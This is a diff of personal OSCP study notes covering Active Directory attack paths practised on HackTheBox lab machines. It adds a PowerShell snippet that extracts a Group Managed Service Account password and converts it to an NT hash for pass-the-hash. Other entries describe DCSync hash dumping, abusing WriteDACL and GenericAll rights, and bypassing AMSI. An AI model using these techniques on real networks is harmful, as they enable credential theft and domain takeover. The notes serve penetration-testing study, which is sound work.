@@ -821,16 +821,42 @@ notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)
 [back to top](#index)
 
 
-Ten attacks you should master for the OSCP:
-
+Ten attacks you should master for the OSCP using Bloodhound and powerview:
 
 10. ReadGMSAPassword 
 Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
 Environment: Search from HacktheBox
 
+From bloodhound, Shortest path--> Click each one. Get to shortest path and see ReadGMSAPassword
+
+![image](https://user-images.githubusercontent.com/83407557/186248120-6d42b931-e1e4-4d00-bc3e-aa68134fc3bb.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186248626-9a4746c2-56fd-406b-b116-e01b7c44828c.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186248787-79af81a7-4bf6-4fac-909e-a4b4e6c986da.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186249143-98b427ce-eec7-48fc-953d-1eb2fc8a2d48.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186249844-6f736f2d-5383-4ea2-933d-0fe0a507d028.png)
+
+```ps
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+# Build a NT-Hash for PTH
+(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
+# Alterantive: build a Credential-Object with the Plain Password
+$cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+```
+
 9. GenericWrite/GenericAll/AllExtendedRights 
 Description: GenericAll allows an attacker to modify the object in question. In this example, we change the password of a Domain Administrator. GenericWrite allows the modification of certain things (More on this in Object from Hackthebox).
 Environment: Search from HacktheBox
+
+
 
 
 8. ForceChangePassword 
@@ -848,22 +874,22 @@ Description: WriteOwner permissions allows an attacker to set the owner of the o
 Environment: Object from HackTheBox
 Timestamp: 23:48
 
-5. SeBackupPrivilege and SeRestorePrivilege
+5.SeBackupPrivilege and SeRestorePrivilege
 Description: SeBackupPrivilege and SeRestorePrivilege allows the attacker access to any file on the machine given he/her takes the appropriate steps. In this example, we acquire NTDS.dit and System.hive
 Environment: Blackfield from Hackthebox
 Timestamp: 28:12
 
-4. NTDS.dit and System.hive
+4.NTDS.dit and System.hive
 Description: With these files and the appropriate permissions, an attacker can dump hashes from the Domain Controller using DCSync.
 Environment: Blackfield from Hackthebox
 Timestamp: 34:38
 
-3. Account Operators/WriteDACL
+3.Account Operators/WriteDACL
 Description: In the account operators group, an attacker can create users and place them in non-protected groups. Placing a new user in a group with WriteDACL, enables an attacker to modify the new user's DACL. In this example, we give our new user DCSync rights.
 Environment: Forest from Hackthebox 
 Timestamp: 42:24
 
-2. ByPassing AMSI 
+2.ByPassing AMSI 
 Description: It may be necessary to bypass the anti-virus in Active Directory. Attackers can attempt to bypass AMSI with the Bypass-4MSI command in Evil-WinRM. Always run this command before introducing a malicious script to the environment. 
 Environment: Forest from Hackthebox
 Timestamp: 48:11
